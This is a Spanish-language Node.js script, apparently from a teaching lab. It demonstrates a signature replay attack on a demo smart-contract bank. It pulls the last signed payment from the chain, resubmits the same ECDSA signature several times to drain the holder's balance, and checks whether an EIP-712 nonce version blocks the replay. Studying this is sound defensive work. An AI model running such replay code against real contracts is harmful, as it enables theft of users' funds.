// ATAQUE 2 — Replay de firmas
// El atacante busca en la blockchain la última llamada a pagarConFirma (los datos de las
// transacciones son públicos), extrae la firma ECDSA y la vuelve a enviar.
// Requisito: que exista al menos un "pago firmado legítimo" (botón en el frontend).
// Uso: node replay.js vulnerable|mitigada [veces]
const { conectar, eth, motivo } = require("./comun");

(async () => {
  const modo = process.argv[2];
  const veces = parseInt(process.argv[3] || "3", 10);
  const { provider, banco } = await conectar(modo);

  console.log(`\n=== REPLAY DE FIRMAS contra la versión ${modo.toUpperCase()} ===`);
  console.log("[1] Buscando pagos firmados en la blockchain…");
  const eventos = await banco.queryFilter(banco.filters.PagoFirmado(), 0);
  if (!eventos.length) {
    console.log("    No hay pagos firmados. Haz primero un 'Pago firmado legítimo' en el frontend.");
    process.exit(0);
  }
  const ultimo = eventos[eventos.length - 1];
  const tx = await provider.getTransaction(ultimo.transactionHash);
  const decodificada = banco.interface.parseTransaction({ data: tx.data, value: tx.value });
  const args = [...decodificada.args];
  const [titular, destinatario, monto] = args;
  const firma = args[args.length - 1];

  console.log(`    Tx encontrada: ${ultimo.transactionHash}`);
  console.log(`    Titular:      ${titular}`);
  console.log(`    Destinatario: ${destinatario}`);
  console.log(`    Monto:        ${eth(monto)} ETH`);
  console.log(`    Firma:        ${firma}`);
  if (args.length === 5) console.log(`    Deadline:     ${args[3]} (firma EIP-712)`);

  const antes = await banco.saldos(titular);
  console.log(`\n[2] Reenviando la misma firma ${veces} veces (saldo del titular: ${eth(antes)} ETH)…`);
  const errores = [];
  for (let i = 1; i <= veces; i++) {
    try {
      await (await banco.pagarConFirma(...args)).wait();
      console.log(`    #${i} ✔ cobrado  → saldo del titular: ${eth(await banco.saldos(titular))} ETH`);
    } catch (e) {
      errores.push(motivo(e));
      console.log(`    #${i} ✘ revertido: ${motivo(e)}`);
    }
  }

  const despues = await banco.saldos(titular);
  if (despues < antes) console.log(`\nRESULTADO: REPLAY EXITOSO — el titular perdió ${eth(antes - despues)} ETH\n`);
  else if (errores.includes("Firma invalida")) console.log("\nRESULTADO: REPLAY BLOQUEADO — la firma ya fue usada (nonce EIP-712)\n");
  else console.log(`\nRESULTADO: sin éxito (${errores[0]}). Reinicia con 'docker compose down -v' y vuelve a probar.\n`);
})().catch((e) => { console.error("Error:", e.message); process.exit(1); });
